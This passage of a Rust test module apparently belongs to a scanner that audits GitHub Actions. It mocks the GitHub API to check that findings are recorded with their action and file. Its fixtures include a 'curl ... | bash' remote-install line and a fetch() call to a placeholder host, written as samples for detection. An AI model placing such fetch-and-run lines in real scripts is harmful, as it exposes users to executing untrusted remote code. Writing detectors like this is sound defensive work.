                ResponseTemplate::new(200)
                    .set_body_string("runs:\n  using: node20\n  main: ../lib/runner\n"),
            )
            .up_to_n_times(1)
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/lib/runner"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string(r#"fetch("https://example.com/install")"#),
            )
            .mount(&server)
            .await;

        let client = GitHubClient::with_base("t".into(), server.uri());
        let action = ActionRef {
            owner: "o".into(),
            repo: "r".into(),
            subpath: Some("sub".into()),
            ref_string: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: Some("v1.0.0".into()),
            line_number: 1,
            raw_line: String::new(),
            value_start: 0,
            value_end: 0,
            block_style: true,
        };
        let mut collector = AuditCollector::new(false);

        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
            .await
            .unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
        assert_eq!(collector.findings.len(), 1);
        assert_eq!(collector.findings[0].source_file, "o/r/sub (lib/runner)");
    }

    #[tokio::test]
    async fn remote_action_findings_record_their_action_and_file() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let sha = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path(format!("/repos/o/r/git/trees/{sha}")))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [
                    { "path": "sub/action.yml", "type": "blob" },
                    { "path": "sub/install.sh", "type": "blob" }
                ],
                "truncated": false
            })))
            .mount(&server)
            .await;
        for (file, body) in [
            (
                "sub/action.yml",
                "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: bash \"${{ github.action_path }}/install.sh\"\n",
            ),
            (
                "sub/install.sh",
                "#!/bin/bash\ncurl -fsSL https://example.invalid/install.sh | bash\n",
            ),
        ] {
            Mock::given(method("GET"))
                .and(path(format!("/repos/o/r/contents/{file}")))
                .respond_with(ResponseTemplate::new(200).set_body_string(body))
                .mount(&server)
                .await;
        }
        let client = GitHubClient::with_base("t".into(), server.uri());
        let action = ActionRef {
            owner: "o".into(),
            repo: "r".into(),
            subpath: Some("sub".into()),
            ref_string: sha.into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: None,
            line_number: 1,
            raw_line: String::new(),
            value_start: 0,
            value_end: 0,
            block_style: true,
        };
        let mut collector = AuditCollector::new(false);
        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
            .await
            .unwrap();
        assert_eq!(status, ActionScanStatus::Complete);
        assert_eq!(collector.findings.len(), 1);
        assert_eq!(
            collector.findings[0].origin,
            Some(ActionFileOrigin {
                action: "o/r/sub".into(),
                revision: sha.into(),
                path: "sub/install.sh".into(),
            })
        );
    }
}
